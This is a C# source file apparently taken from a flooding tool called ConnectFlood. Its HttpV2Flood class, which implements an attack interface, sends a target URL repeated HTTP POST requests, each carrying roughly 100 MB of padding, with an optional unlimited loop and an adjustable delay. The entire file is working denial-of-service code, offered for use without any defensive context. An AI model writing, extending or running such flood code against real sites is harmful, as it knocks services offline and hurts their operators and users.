using System;
using System.Net;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class HttpV2Flood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string sizeStr)
        {
            Console.WriteLine($"[HTTP] Attacking {target} | Packets: {(packetCount == -1 ? "Unlimited" : packetCount.ToString())} | Speed: {speed}ms");
            int dataSize = 100_000_000; // 100MB default
            if (int.TryParse(sizeStr, out int parsedSize) && parsedSize > 0)
            {
                dataSize = parsedSize;
            }

            string largeData = new string('A', dataSize);

            for (int i = 0; packetCount == -1 || i < packetCount; i++)
            {
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(target);
                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";

                    byte[] postData = Encoding.UTF8.GetBytes("data=" + largeData);
                    request.ContentLength = postData.Length;

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(postData, 0, postData.Length);
                    }

                    using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                    {
                        Console.WriteLine($"[{i}] HTTP {response.StatusCode}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[{i}] HTTP Error: {ex.Message}");
                }

                Thread.Sleep(speed);
            }
        }
    }
}
